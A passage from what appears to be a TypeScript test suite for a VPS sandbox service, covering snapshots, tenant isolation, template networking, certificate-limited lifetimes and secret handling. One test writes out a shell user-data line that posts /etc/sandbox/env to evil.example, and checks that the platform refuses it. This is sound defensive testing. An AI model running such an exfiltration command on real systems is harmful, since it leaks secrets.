    await call('sandboxes', 'delete', { tenantId: 'acme', sandboxId: sandbox.id });
    await expect(
      callStore('snapshot', { tenantId: 'acme', sandboxId: sandbox.id }),
    ).rejects.toMatchObject({ code: 'INVALID_STATE' });
  });

  it('send instance.snapshot to the host, settle from its result, and restore on the same CPU model', async () => {
    const { template, sandbox } = await running();
    const snapshot = (await callStore('snapshot', {
      tenantId: 'acme',
      sandboxId: sandbox.id,
      idempotencyKey: 'snap-1',
    })) as SnapshotView;
    expect(snapshot).toMatchObject({ state: 'pending', includeMemory: true, keep: false });
    expect(snapshot.id).toMatch(/^snap_/);
    const [command] = recorded.commands;
    expect(command).toMatchObject({
      kind: 'instance.snapshot',
      nodeId: 'node_01jz00000000000000000000va',
      idempotencyKey: `vps.sandboxes:${snapshot.id}:snapshot`,
      payload: {
        instanceId: sandbox.instanceId,
        uploadUrl: `https://store.example/put/${snapshot.id}?sig=x`,
        uploadHeaders: [{ name: 'x-amz-acl', value: 'private' }],
        imageId: snapshot.id,
        includeMemory: true,
      },
    });
    expect(withStore.commandKinds).toMatchObject([
      { kind: 'instance.snapshot', lane: 'bulk', retrySafe: false, roles: ['node'] },
    ]);
    // A retry under the key returns it; nothing else is sent.
    expect(
      (
        (await callStore('snapshot', {
          tenantId: 'acme',
          sandboxId: sandbox.id,
          idempotencyKey: 'snap-1',
        })) as SnapshotView
      ).id,
    ).toBe(snapshot.id);
    expect(recorded.commands).toHaveLength(1);

    await settle(command!.id, 'succeeded', 'AMD EPYC 9654 96-Core Processor');
    recorded.events = [];
    await reconcileWith(snapshot.id);
    expect(recorded.events).toMatchObject([
      {
        type: 'sandbox.snapshot.ready',
        subject: `sandbox/${sandbox.id}`,
        data: { snapshotId: snapshot.id, sha256: 'ab'.repeat(32), sizeBytes: 1234 },
      },
    ]);
    const viewed = (await call('sandboxes', 'get', {
      tenantId: 'acme',
      sandboxId: sandbox.id,
    })) as { snapshots: SnapshotView[] };
    expect(viewed.snapshots).toMatchObject([
      { id: snapshot.id, state: 'ready', cpuModel: 'AMD-EPYC-9654-96-Core-Processor' },
    ]);

    // The restore lands only where inventory labelled the same CPU model.
    await db.query(
      `INSERT INTO node_labels (node_id, key, value, source)
       VALUES ('node_01jz00000000000000000000vb', 'cpu.model', 'AMD-EPYC-9654-96-Core-Processor', 'inventory')`,
    );
    const restored = (await callStore('create', {
      tenantId: 'acme',
      templateId: template.id,
      fromSnapshot: snapshot.id,
      idempotencyKey: 'restore-1',
    })) as SandboxView & { fromSnapshot?: string; nodeId?: string };
    expect(restored).toMatchObject({
      fromSnapshot: snapshot.id,
      warm: false,
      nodeId: 'node_01jz00000000000000000000vb',
    });
    expect(recorded.authz.findLast((row) => row.type === 'sandbox')?.attributes).toMatchObject({
      fromSnapshot: snapshot.id,
      warm: false,
    });
    const specs = await db.transaction((tx) =>
      instanceSpecs(tx, 'node_01jz00000000000000000000vb'),
    );
    expect(specs.find((spec) => spec.id === restored.instanceId)?.restoreFrom).toEqual({
      url: `https://store.example/${snapshot.id}`,
      sha256: 'ab'.repeat(32),
      imageId: snapshot.id,
    });
  });

  it("refuse another tenant's snapshot and a pending one; a failed command fails the snapshot", async () => {
    const { template, sandbox } = await running();
    const snapshot = (await callStore('snapshot', {
      tenantId: 'acme',
      sandboxId: sandbox.id,
      includeMemory: false,
    })) as SnapshotView;
    await expect(
      callStore('create', {
        tenantId: 'acme',
        templateId: template.id,
        fromSnapshot: snapshot.id,
        idempotencyKey: 'too-soon',
      }),
    ).rejects.toMatchObject({ code: 'INVALID_STATE' });
    await settle(recorded.commands[0]!.id, 'failed');
    recorded.events = [];
    await reconcileWith('all');
    expect(
      recorded.events.find((event) => event.type === 'sandbox.snapshot.failed')?.data,
    ).toMatchObject({
      snapshotId: snapshot.id,
      reason: 'unsupported',
    });

    // Another tenant's ready snapshot looks exactly like a missing one.
    await db.query(
      `INSERT INTO sandbox_templates (id, tenant_id, name, pool_id, flavor, image_id, runtime,
                                      default_ttl_seconds, max_ttl_seconds, created_by, version)
       VALUES ('sbxt_01jz00000000000000000000gx', 'globex', 't', $1, 's1.small', 'ubuntu-24.04',
               'cloud-hypervisor', 60, 60, 'usr_g', 1)`,
      [pool],
    );
    await db.query(
      `INSERT INTO sandboxes (id, tenant_id, template_id, pool_id, instance_id, draft, ttl_seconds,
                              owner_identity_id, idempotency_key, request_hash, version)
       VALUES ('sbx_01jz00000000000000000000gx', 'globex', 'sbxt_01jz00000000000000000000gx', $1,
               'inst_01jz00000000000000000000gx', false, 60, 'usr_g', 'k', '\\x00', 1)`,
      [pool],
    );
    await db.query(
      `INSERT INTO sandbox_snapshots (id, tenant_id, sandbox_id, template_id, instance_id, node_id, runtime,
                                      include_memory, state, command_id, url, sha256, owner_identity_id, version)
       VALUES ('snap_01jz00000000000000000000gx', 'globex', 'sbx_01jz00000000000000000000gx',
               'sbxt_01jz00000000000000000000gx', 'inst_01jz00000000000000000000gx',
               'node_01jz00000000000000000000va', 'cloud-hypervisor', false, 'ready', 'cmd_x',
               'https://store.example/globex', $1, 'usr_g', 1)`,
      ['cd'.repeat(32)],
    );
    await expect(
      callStore('create', {
        tenantId: 'acme',
        templateId: template.id,
        fromSnapshot: 'snap_01jz00000000000000000000gx',
        idempotencyKey: 'steal',
      }),
    ).rejects.toMatchObject({ code: 'NOT_FOUND' });
  });

  it('go with their sandbox unless kept', async () => {
    const { sandbox } = await running();
    const dropped = (await callStore('snapshot', {
      tenantId: 'acme',
      sandboxId: sandbox.id,
    })) as SnapshotView;
    const kept = (await callStore('snapshot', {
      tenantId: 'acme',
      sandboxId: sandbox.id,
      keep: true,
    })) as SnapshotView;
    // Both uploads finished before the sandbox goes.
    for (const command of recorded.commands) await settle(command.id, 'succeeded');
    await reconcileWith('all');
    deletedObjects.length = 0;
    await call('sandboxes', 'delete', { tenantId: 'acme', sandboxId: sandbox.id });
    await reconcileInstance(sandbox.instanceId);
    await hostsReport('absent');
    await reconcileWith('all');
    expect(deletedObjects).toEqual([dropped.id]);
    const states = await db.query<{ id: string; state: string }>(
      `SELECT id, state FROM sandbox_snapshots ORDER BY created_at, id`,
    );
    expect(Object.fromEntries(states.rows.map((row) => [row.id, row.state]))).toEqual({
      [dropped.id]: 'deleted',
      [kept.id]: 'ready',
    });
    // The tenant's teardown takes kept ones too.
    await withStore.tenantDeleted!(moduleContext(db), 'acme');
    expect(deletedObjects).toEqual([dropped.id, kept.id]);
  });

  it('are listed, read and deleted as their own resource, kept ones after their sandbox', async () => {
    const { sandbox } = await running();
    const kept = (await callStore('snapshot', {
      tenantId: 'acme',
      sandboxId: sandbox.id,
      keep: true,
    })) as SnapshotView;
    expect(recorded.authz.findLast((row) => row.type === 'sandbox-snapshot')).toMatchObject({
      id: kept.id,
      ownerId: 'usr_alice',
      attributes: { sandboxId: sandbox.id, includeMemory: true },
    });
    await settle(recorded.commands[0]!.id, 'succeeded');
    await reconcileWith(kept.id);
    // The sandbox goes; its kept snapshot stays, visible to its owner only by default.
    await call('sandboxes', 'delete', { tenantId: 'acme', sandboxId: sandbox.id });
    await reconcileInstance(sandbox.instanceId);
    await hostsReport('absent');
    await reconcileWith('all');
    const snapshots = storeApi.sandboxSnapshots as unknown as Record<string, Definition>;
    expect(await run(snapshots.list!, { tenantId: 'acme' }, alice)).toMatchObject({
      items: [{ id: kept.id, state: 'ready', ownerIdentityId: 'usr_alice' }],
    });
    expect(await run(snapshots.list!, { tenantId: 'acme' }, bob)).toMatchObject({ items: [] });
    expect(await run(snapshots.list!, { tenantId: 'acme', scope: 'all' }, bob)).toMatchObject({
      items: [{ id: kept.id }],
    });
    expect(
      await run(snapshots.get!, { tenantId: 'acme', snapshotId: kept.id }, alice),
    ).toMatchObject({ id: kept.id, sandboxId: sandbox.id });

    deletedObjects.length = 0;
    recorded.events = [];
    expect(await run(snapshots.delete!, { tenantId: 'acme', snapshotId: kept.id }, alice)).toEqual({
      deleted: true,
    });
    expect(eventTypes()).toEqual(['sandbox.snapshot.deleted']);
    await expect(
      run(snapshots.get!, { tenantId: 'acme', snapshotId: kept.id }, alice),
    ).rejects.toMatchObject({ code: 'NOT_FOUND' });
    // Idempotent (its authz row stays until the purge); the object goes with the next pass,
    // outside the request's transaction.
    expect(await run(snapshots.delete!, { tenantId: 'acme', snapshotId: kept.id }, alice)).toEqual({
      deleted: true,
    });
    expect(deletedObjects).toEqual([]);
    expect(recorded.removed.some((row) => row.id === kept.id)).toBe(false);
    await reconcileWith('all');
    expect(deletedObjects).toEqual([kept.id]);
    expect(recorded.removed.at(-1)).toEqual({
      type: 'sandbox-snapshot',
      id: kept.id,
      tenantId: 'acme',
    });
    await expect(
      run(snapshots.delete!, { tenantId: 'globex', snapshotId: kept.id }, alice),
    ).rejects.toMatchObject({ code: 'NOT_FOUND' });
  });

  it("belong to the sandbox's owner, whoever took them, and outlive deletion while a restore needs them", async () => {
    const { template, sandbox } = await running();
    // Bob may snapshot alice's sandbox (sandboxes:update) but gets neither its memory nor a login.
    const taken = (await callStore(
      'snapshot',
      { tenantId: 'acme', sandboxId: sandbox.id },
      bob,
    )) as SnapshotView & { ownerIdentityId: string };
    expect(taken.ownerIdentityId).toBe('usr_alice');
    expect(recorded.authz.findLast((row) => row.type === 'sandbox-snapshot')?.ownerId).toBe(
      'usr_alice',
    );
    await settle(recorded.commands[0]!.id, 'succeeded');
    await reconcileWith(taken.id);
    await expect(
      callStore(
        'create',
        { tenantId: 'acme', templateId: template.id, fromSnapshot: taken.id, idempotencyKey: 'x' },
        bob,
      ),
    ).rejects.toMatchObject({ code: 'NOT_FOUND' });
    const restored = (await callStore('create', {
      tenantId: 'acme',
      templateId: template.id,
      fromSnapshot: taken.id,
      idempotencyKey: 'mine',
    })) as SandboxView;
    // Deleting the snapshot while its restore lives keeps the object (a recreate downloads again).
    deletedObjects.length = 0;
    const snapshots = storeApi.sandboxSnapshots as unknown as Record<string, Definition>;
    await run(snapshots.delete!, { tenantId: 'acme', snapshotId: taken.id }, alice);
    await reconcileWith('all');
    expect(deletedObjects).toEqual([]);
    await call('sandboxes', 'delete', { tenantId: 'acme', sandboxId: restored.id });
    await reconcileInstance(restored.instanceId);
    await hostsReport('absent');
    await reconcileWith('all');
    expect(deletedObjects).toEqual([taken.id]);
  });

  it('keep a pending upload’s object until its command settles, then delete it', async () => {
    const { sandbox } = await running();
    const pending = (await callStore('snapshot', {
      tenantId: 'acme',
      sandboxId: sandbox.id,
    })) as SnapshotView;
    deletedObjects.length = 0;
    await call('sandboxes', 'delete', { tenantId: 'acme', sandboxId: sandbox.id });
    await reconcileInstance(sandbox.instanceId);
    await hostsReport('absent');
    await reconcileWith('all');
    // Deleted, but the host may still be uploading: nothing to delete yet.
    expect(deletedObjects).toEqual([]);
    await settle(recorded.commands[0]!.id, 'succeeded');
    await reconcileWith('all');
    expect(deletedObjects).toEqual([pending.id]);
    await reconcileWith('all');
    expect(deletedObjects).toEqual([pending.id]);
  });

  it("restore only the caller's own snapshots, and memory restores keep the exec principal", async () => {
    const { template, sandbox } = await running();
    const snapshot = (await callStore('snapshot', {
      tenantId: 'acme',
      sandboxId: sandbox.id,
    })) as SnapshotView;
    await settle(recorded.commands[0]!.id, 'succeeded');
    await reconcileWith(snapshot.id);
    // Another user of the tenant cannot boot alice's memory.
    await expect(
      callStore(
        'create',
        {
          tenantId: 'acme',
          templateId: template.id,
          fromSnapshot: snapshot.id,
          idempotencyKey: 'b',
        },
        bob,
      ),
    ).rejects.toMatchObject({ code: 'NOT_FOUND' });
    const restored = (await callStore('create', {
      tenantId: 'acme',
      templateId: template.id,
      fromSnapshot: snapshot.id,
      idempotencyKey: 'mine',
    })) as SandboxView;
    const { rows } = await db.query<{ restore_from: { principalInstanceId?: string } }>(
      `SELECT restore_from FROM instances WHERE id = $1`,
      [restored.instanceId],
    );
    expect(rows[0]!.restore_from.principalInstanceId).toBe(sandbox.instanceId);
  });

  it("refuse a memory restore that would outlive the guest's host certificate", async () => {
    const { template, sandbox } = await running();
    const snapshot = (await callStore('snapshot', {
      tenantId: 'acme',
      sandboxId: sandbox.id,
    })) as SnapshotView;
    await settle(recorded.commands[0]!.id, 'succeeded');
    await reconcileWith(snapshot.id);
    await db.query(
      `UPDATE sandbox_snapshots SET host_certified = true, host_cert_valid_before = $2::timestamptz
        WHERE id = $1`,
      [snapshot.id, new Date(clock.now() + 30 * 60_000).toISOString()],
    );
    const restore = (key: string, extra: Record<string, unknown> = {}) =>
      callStore('create', {
        tenantId: 'acme',
        templateId: template.id,
        fromSnapshot: snapshot.id,
        idempotencyKey: key,
        ...extra,
      }) as Promise<SandboxView>;
    await expect(restore('hour')).rejects.toMatchObject({
      code: 'INVALID_INPUT',
      message: expect.stringContaining('at most 1800s from now'),
    });
    const restored = await restore('half', { ttlSeconds: 1800 });
    expect(restored.expiresAt).toBe(clock.now() + 1800_000);
  });
});

describe('template network and versions', () => {
  it("carries the template's network to the instance spec; egress stays implicit", async () => {
    const closed = await createTemplate({ name: 'closed', network: 'none' });
    const open = await createTemplate({ name: 'open' });
    expect(closed).toMatchObject({ network: 'none' });
    expect(open).toMatchObject({ network: 'egress' });
    // A host whose bcd cannot enforce the policy never gets the sandbox (an old bcd would drop it).
    const stuck = await createSandbox(closed.id, { idempotencyKey: 'no-capable-host' });
    expect(stuck).toMatchObject({ state: 'starting', instanceState: 'scheduling' });
    await db.query(
      `INSERT INTO node_labels (node_id, key, value, source)
       SELECT id, 'bc.dev/cap.instance.network-policy', '1', 'system' FROM nodes`,
    );
    const a = await createSandbox(closed.id, { idempotencyKey: 'a' });
    expect(a.instanceState).toBe('provisioning');
    const b = await createSandbox(open.id, { idempotencyKey: 'b' });
    const specs = await db.transaction(async (tx) => [
      ...(await instanceSpecs(tx, 'node_01jz00000000000000000000va')),
      ...(await instanceSpecs(tx, 'node_01jz00000000000000000000vb')),
    ]);
    const byId = new Map(specs.map((spec) => [spec.id, spec]));
    expect(byId.get(a.instanceId)?.networkPolicy).toBe('none');
    expect(byId.get(b.instanceId)).not.toHaveProperty('networkPolicy');
    await expect(
      call('sandboxTemplates', 'update', {
        tenantId: 'acme',
        templateId: open.id,
        network: 'internet',
      }),
    ).rejects.toMatchObject({ code: 'INVALID_INPUT' });
  });

  it('needs an IP range for private and none (the host enforces them on the addresses)', async () => {
    await db.query(`DELETE FROM ip_pools WHERE pool_id = $1`, [pool]);
    await expect(createTemplate({ name: 'none', network: 'none' })).rejects.toMatchObject({
      code: 'INVALID_STATE',
      message: expect.stringContaining('IP range'),
    });
    const open = await createTemplate({ name: 'open' });
    await expect(
      call('sandboxTemplates', 'update', {
        tenantId: 'acme',
        templateId: open.id,
        network: 'private',
      }),
    ).rejects.toMatchObject({ code: 'INVALID_STATE' });
  });

  it('never claims a warm instance made from an older template version, and replaces it', async () => {
    const template = await createTemplate({ warm: { min: 1 } });
    await reconcileSandboxes();
    await hostsReport('paused');
    const [old] = (
      await db.query<{ id: string }>(`SELECT id FROM instances WHERE warm_template_id = $1`, [
        template.id,
      ])
    ).rows;
    await call('sandboxTemplates', 'update', {
      tenantId: 'acme',
      templateId: template.id,
      userData: '#cloud-config\n',
    });
    // Stale until the pass: a create goes cold rather than boot yesterday's template.
    expect((await createSandbox(template.id)).warm).toBe(false);
    await reconcileSandboxes();
    const warm = await db.query<{ id: string; desired_state: string }>(
      `SELECT id, desired_state FROM instances WHERE warm_template_id = $1 ORDER BY created_at, id`,
      [template.id],
    );
    expect(Object.fromEntries(warm.rows.map((row) => [row.id, row.desired_state]))).toMatchObject({
      [old!.id]: 'deleted',
    });
    expect(warm.rows.filter((row) => row.desired_state === 'paused')).toHaveLength(1);
  });

  it('never lets a sandbox outlive its host certificate: claims, extends and warm recycling', async () => {
    const certify = (id: string, validBefore: number) =>
      db.query(
        `UPDATE instances SET host_certified = true, host_cert_valid_before = $2::timestamptz WHERE id = $1`,
        [id, new Date(validBefore).toISOString()],
      );
    const warmIds = async () =>
      (
        await db.query<{ id: string }>(
          `SELECT id FROM instances WHERE warm_template_id = $1 AND desired_state <> 'deleted'`,
          [template.id],
        )
      ).rows.map((row) => row.id);
    const template = await createTemplate({ warm: { min: 1 } });
    await reconcileSandboxes();
    await hostsReport('paused');
    const [warm] = await warmIds();
    // 50 minutes of certificate left: not enough for the default hour, so that create goes cold...
    await certify(warm!, clock.now() + 50 * 60_000);
    expect((await createSandbox(template.id)).warm).toBe(false);
    // ...while a 30-minute one fits it.
    const claimed = await createSandbox(template.id, { idempotencyKey: 'short', ttlSeconds: 1800 });
    expect(claimed).toMatchObject({ warm: true, instanceId: warm });
    await expect(
      call('sandboxes', 'extend', { tenantId: 'acme', sandboxId: claimed.id, by: '30m' }),
    ).rejects.toMatchObject({
      code: 'INVALID_INPUT',
      message: expect.stringContaining('host certificate is valid until'),
    });
    expect(
      await call('sandboxes', 'extend', { tenantId: 'acme', sandboxId: claimed.id, by: '10m' }),
    ).toMatchObject({ expiresAt: T0 + 40 * 60_000 });

    // A warm instance whose certificate no longer covers the default TTL is replaced.
    await reconcileSandboxes();
    await hostsReport('paused');
    const [refill] = await warmIds();
    await certify(refill!, clock.now() + 59 * 60_000);
    await reconcileSandboxes();
    const after = await warmIds();
    expect(after).toHaveLength(1);
    expect(after).not.toContain(refill);
  });

  it('stamps readyAt the moment the instance runs, not a sandbox pass later', async () => {
    const template = await createTemplate();
    const sandbox = await createSandbox(template.id);
    await advance(7_000);
    recorded.events = [];
    await hostsReport('running');
    expect(await getSandbox(sandbox.id)).toMatchObject({ state: 'ready', readyAt: T0 + 7_000 });
    expect(recorded.events.map((event) => event.type)).toContain('sandbox.ready');
    recorded.events = [];
    await reconcileSandboxes();
    expect(recorded.events.map((event) => event.type)).not.toContain('sandbox.ready');
  });
});

describe('selfCheck', () => {
  const check = () => module.selfCheck!(moduleContext(db));
  const sandboxFindings = async () =>
    (await check()).filter((finding) => finding.check.startsWith('vps.sandboxes'));

  it('flags missed expiries, stuck deletions and warm pools that stopped refilling', async () => {
    const template = await createTemplate({ warm: { min: 2 } });
    const sandbox = await createSandbox(template.id, { ttlSeconds: 60 });
    expect(await sandboxFindings()).toEqual([]);
    // Two passes past expiry with no reconciler: the expiry finding.
    await advance(60_000 + 31_000);
    // (The template is too young for a warm finding: no pass has run to refill it yet.)
    expect(await sandboxFindings()).toMatchObject([
      { check: 'vps.sandboxes.expiry', severity: 'error', count: 1 },
    ]);
    // The pass expires it; its host never reports the instance gone.
    await reconcileSandboxes();
    await hostsReport('paused');
    await advance(11 * 60_000);
    const findings = await sandboxFindings();
    expect(findings.map((finding) => finding.check)).toEqual(['vps.sandboxes.deleting']);
    expect(sandbox.id).toMatch(/^sbx_/);
  });

  it('flags a warm pool below min with no refill for 10 minutes', async () => {
    // Quota for one small instance only: the second warm instance can never be created.
    await db.query(
      `UPDATE quota_usage SET max = 2 WHERE tenant_id = 'acme' AND pool_id = $1 AND resource = 'vcpu'`,
      [pool],
    );
    const template = await createTemplate({ warm: { min: 2 } });
    await reconcileSandboxes();
    await hostsReport('paused');
    await advance(11 * 60_000);
    await reconcileSandboxes();
    expect(await sandboxFindings()).toMatchObject([
      {
        check: 'vps.sandboxes.warm',
        count: 1,
        message: expect.stringContaining(template.id),
      },
    ]);
  });
});

describe('template env', () => {
  afterEach(async () => {
    broker = undefined;
    denied.clear();
    await db.query(`DELETE FROM secret_refs`);
  });
  const putSecret = (ref: string, name: string) =>
    db.query(
      `INSERT INTO secret_refs (ref, tenant_id, name, version, store, last_idempotency_key)
       VALUES ($1, 'acme', $2, 1, 'local', 'k')`,
      [ref, name],
    );

  it('uses only secrets the tenant put, and decides secrets:manage for the template author', async () => {
    broker = {
      resolve: async (ref) => `value:${ref}`,
      put: async (tenantId) => `secret://${tenantId}/sealed`,
      delete: async () => {},
    };
    // A platform-minted secret (sealed user data, a join token) is not the tenant's to hand out.
    await expect(
      createTemplate({ env: { TOKEN: 'secret://acme/minted-by-the-platform' } }),
    ).rejects.toMatchObject({
      code: 'INVALID_INPUT',
      message: expect.stringContaining('secrets.put'),
    });
    await putSecret('secret://acme/api-token', 'api-token');
    denied.add('compute:secrets:manage');
    await expect(
      createTemplate({ env: { TOKEN: 'secret://acme/api-token' } }),
    ).rejects.toMatchObject({ code: 'ACCESS_DENIED' });
    denied.clear();
    recorded.decisions = [];
    const template = await createTemplate({ env: { TOKEN: 'secret://acme/api-token' } });
    expect(recorded.decisions).toEqual(['compute:secrets:manage']);
    // An update that only changes lifetimes needs no extra decision...
    recorded.decisions = [];
    await call('sandboxTemplates', 'update', {
      tenantId: 'acme',
      templateId: template.id,
      maxTtlSeconds: 7200,
    });
    expect(recorded.decisions).toEqual([]);
    // ...but one that changes what runs next to the secrets does, though it names none itself.
    denied.add('compute:secrets:manage');
    await expect(
      call('sandboxTemplates', 'update', {
        tenantId: 'acme',
        templateId: template.id,
        userData: '#!/bin/sh\ncurl -d @/etc/sandbox/env https://evil.example\n',
      }),
    ).rejects.toMatchObject({ code: 'ACCESS_DENIED' });
    await expect(
      call('sandboxTemplates', 'update', {
        tenantId: 'acme',
        templateId: template.id,
        imageId: 'ubuntu-24.04',
      }),
    ).rejects.toMatchObject({ code: 'ACCESS_DENIED' });
  });

  it('in the root tenant, also decides the fleet: its secrets share the namespace', async () => {
    broker = {
      resolve: async (ref) => `value:${ref}`,
      put: async (tenantId) => `secret://${tenantId}/sealed`,
      delete: async () => {},
    };
    await db.query(
      `INSERT INTO secret_refs (ref, tenant_id, name, version, store, last_idempotency_key)
       VALUES ('secret://root/token', 'root', 'token', 1, 'local', 'k')`,
    );
    recorded.decisions = [];
    await call(
      'sandboxTemplates',
      'create',
      templateInput({ tenantId: 'root', env: { TOKEN: 'secret://root/token' } }),
      root,
    );
    expect(recorded.decisions).toEqual(['compute:secrets:manage', 'compute:secrets:manage']);
    expect(recorded.fleetDecisions).toBe(1);
  });

  it('refuses a fleet-scoped secret outright, whoever may manage it', async () => {
    broker = {
      resolve: async (ref) => `value:${ref}`,
      put: async (tenantId) => `secret://${tenantId}/sealed`,
      delete: async () => {},
    };
    await db.query(
      `INSERT INTO secret_refs (ref, tenant_id, name, version, store, last_idempotency_key, scope)
       VALUES ('secret://root/fleet-token', 'root', 'fleet-token', 1, 'local', 'k', 'fleet')`,
    );
    await expect(
      call(
        'sandboxTemplates',
        'create',
        templateInput({ tenantId: 'root', env: { TOKEN: 'secret://root/fleet-token' } }),
        root,
      ),
    ).rejects.toMatchObject({
      code: 'INVALID_INPUT',
      message: expect.stringContaining('fleet secret'),
    });
  });

  it("resolves the tenant's secrets into /etc/sandbox/env, sealed by the broker, never inline", async () => {
    await putSecret('secret://acme/api-token', 'api-token');
    await putSecret('secret://acme/db', 'db');
    const sealed: { tenantId: string; value: string }[] = [];
    broker = {
      resolve: async (ref) =>
        ref === 'secret://acme/api-token' ? "it's-a-secret" : `value:${ref}`,
      put: async (tenantId, value) => {
        sealed.push({ tenantId, value });
        return `secret://${tenantId}/sealed-${sealed.length}`;
      },
      delete: async () => {},
    };
    const template = await createTemplate({
      env: { API_TOKEN: 'secret://acme/api-token', DB_URL: 'secret://acme/db' },
    });
    expect(template).toMatchObject({
      env: { API_TOKEN: 'secret://acme/api-token', DB_URL: 'secret://acme/db' },
    });
    const sandbox = await createSandbox(template.id);
    const { rows } = await db.query<{ user_data: string; user_data_sealed: boolean }>(
      `SELECT user_data, user_data_sealed FROM instances WHERE id = $1`,
      [sandbox.instanceId],
    );
    // The row keeps the broker's ref; the values went only into the sealed content.
    expect(rows[0]).toEqual({ user_data: 'secret://acme/sealed-1', user_data_sealed: true });
    expect(sealed).toHaveLength(1);
    const content = sealed[0]!.value;
    expect(content).toContain('"/etc/sandbox/env"');
    expect(content).toContain('permissions: "0600"');
    expect(content).toContain(
      JSON.stringify(`API_TOKEN='it'\\''s-a-secret'\nDB_URL='value:secret://acme/db'\n`),
    );
    // No exec CA configured: no sshd changes.
    expect(content).not.toContain('TrustedUserCAKeys');

    // Update replaces the whole map; `{}` removes every variable.
    const updated = (await call('sandboxTemplates', 'update', {
      tenantId: 'acme',
      templateId: template.id,
      env: {},
    })) as { env: Record<string, string> };
    expect(updated.env).toEqual({});
  });
});

describe('IAM reactions (§12.8)', () => {
  const agent: Caller = { ...alice, agentId: 'agt_1', delegationId: 'dlg_1' };
  const react = <T>(fn: (tx: SqlTx, context: ModuleContext) => Promise<T>) =>
    db.transaction((tx) => fn(tx, moduleContext(db)));
  const states = async () =>
    Object.fromEntries(
      (
        await db.query<{ id: string; deleting: boolean }>(
          `SELECT id, deleting_at IS NOT NULL AS deleting FROM sandboxes WHERE NOT draft`,
        )
      ).rows.map((row) => [row.id, row.deleting]),
    );

  it('delete the sandboxes a suspended agent or a revoked delegation created, and nothing else', async () => {
    const template = await createTemplate();
    const byAgent = await createSandbox(template.id, { idempotencyKey: 'agent' }, agent);
    const byAlice = await createSandbox(template.id, { idempotencyKey: 'alice' });
    expect(
      await react((tx, context) =>
        withdrawAgentSandboxes(tx, context, {
          tenantId: 'acme',
          delegationId: 'dlg_other',
          reason: 'delegation:revoke',
        }),
      ),
    ).toEqual({ deleted: [], reassigned: [] });
    expect(
      await react((tx, context) =>
        withdrawAgentSandboxes(tx, context, {
          tenantId: 'acme',
          agentId: 'agt_1',
          reason: 'agent:suspend',
        }),
      ),
    ).toEqual({ deleted: [byAgent.id], reassigned: [] });
    expect(await states()).toEqual({ [byAgent.id]: true, [byAlice.id]: false });
    expect(recorded.events.find((event) => event.type === 'sandbox.withdrawn')).toMatchObject({
      subject: `sandbox/${byAgent.id}`,
      data: { reason: 'agent:suspend' },
    });
    const { rows } = await db.query<{ desired_state: string }>(
      `SELECT desired_state FROM instances WHERE id = $1`,
      [byAgent.instanceId],
    );
    expect(rows[0]!.desired_state).toBe('deleted');
    // Level-triggered: a replay (or the whole tenant's agents) finds nothing else open.
    expect(
      await react((tx, context) =>
        withdrawAgentSandboxes(tx, context, {
          tenantId: 'acme',
          allAgents: true,
          reason: 'agent:suspend-all',
        }),
      ),
    ).toEqual({ deleted: [], reassigned: [] });
  });

  it("move an offboarded owner's sandboxes, snapshots and templates to the successor", async () => {
    const template = await createTemplate({ warm: { min: 1 } });
    await reconcileSandboxes();
    await hostsReport('paused');
    const sandbox = await createSandbox(template.id, { idempotencyKey: 'mine', ttlSeconds: 600 });
    expect(sandbox.warm).toBe(true);
    await reconcileSandboxes();
    await db.query(
      `INSERT INTO sandbox_snapshots (id, tenant_id, sandbox_id, template_id, instance_id, node_id, runtime,
                                      include_memory, keep, state, command_id, url, owner_identity_id, version)
       VALUES ('snap_kept', 'acme', $1, $2, $3, 'node', 'cloud-hypervisor', true, true, 'ready', 'cmd', 'u',
               'usr_alice', 1)`,
      [sandbox.id, template.id, sandbox.instanceId],
    );
    recorded.authz = [];
    const result = await react((tx, context) =>
      reassignSandboxes(tx, context, {
        tenantId: 'acme',
        identityId: 'usr_alice',
        successorId: 'usr_bob',
        reason: 'identity:offboard',
      }),
    );
    expect(result).toEqual({ deleted: [], reassigned: [sandbox.id] });
    expect(await getSandbox(sandbox.id)).toMatchObject({ ownerIdentityId: 'usr_bob' });
    const owners = await db.query<{ id: string; owner_identity_id: string }>(
      `SELECT id, owner_identity_id FROM instances WHERE state <> 'deleted'`,
    );
    expect(owners.rows.every((row) => row.owner_identity_id === 'usr_bob')).toBe(true);
    const owned = Object.fromEntries(
      recorded.authz.map((row) => [`${row.type}/${row.id}`, row.ownerId]),
    );
    expect(owned).toMatchObject({
      [`sandbox/${sandbox.id}`]: 'usr_bob',
      [`instance/${sandbox.instanceId}`]: 'usr_bob',
      'sandbox-snapshot/snap_kept': 'usr_bob',
      [`sandbox-template/${template.id}`]: 'usr_bob',
    });
    expect(Object.keys(owned).filter((key) => key.startsWith('instance/'))).toHaveLength(
      owners.rows.length,
    );
    expect(
      recorded.events.find((event) => event.type === 'sandbox.reassigned')?.data,
    ).toMatchObject({ from: 'usr_alice', to: 'usr_bob', reason: 'identity:offboard' });
    // Bob can restore it now: restores are owner-only.
    const snapshot = await db.query<{ owner_identity_id: string }>(
      `SELECT owner_identity_id FROM sandbox_snapshots WHERE id = 'snap_kept'`,
    );
    expect(snapshot.rows[0]!.owner_identity_id).toBe('usr_bob');
  });

  it('delete an owner’s open sandboxes when nobody succeeds them', async () => {
    const template = await createTemplate();
    const mine = await createSandbox(template.id, { idempotencyKey: 'mine' });
    const bobs = await createSandbox(template.id, { idempotencyKey: 'bobs' }, bob);
    expect(
      await react((tx, context) =>
        reassignSandboxes(tx, context, {
          tenantId: 'acme',
          identityId: 'usr_alice',
          reason: 'identity:delete',
        }),
      ),
    ).toEqual({ deleted: [mine.id], reassigned: [] });
    expect(await states()).toEqual({ [mine.id]: true, [bobs.id]: false });
  });
});

describe('exec trust', () => {
  const caPublicKey =
    'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGq3w8xQy9eYyB7y0YyBsandboxCA bc-sandbox-ca';
  const execModule = vps({ runtimes: ['cloud-hypervisor'], images, sandboxExec: { caPublicKey } });
  const execApi = execModule.api!(moduleContext(db)) as VpsApi;

  it("puts the sandbox CA and the instance's own principal ahead of the template's user data", async () => {
    const template = await createTemplate({ userData: '#!/bin/sh\necho hello\n' });
    const sandbox = (await run(
      (execApi.sandboxes as Record<string, Definition>).create!,
      { tenantId: 'acme', templateId: template.id, idempotencyKey: 'exec-1' },
      alice,
    )) as SandboxView;
    const { rows } = await db.query<{ user_data: string }>(
      `SELECT user_data FROM instances WHERE id = $1`,
      [sandbox.instanceId],
    );
    const userData = rows[0]!.user_data;
    expect(userData).toMatch(/^Content-Type: multipart\/mixed; boundary="bc-sandbox-inst_/);
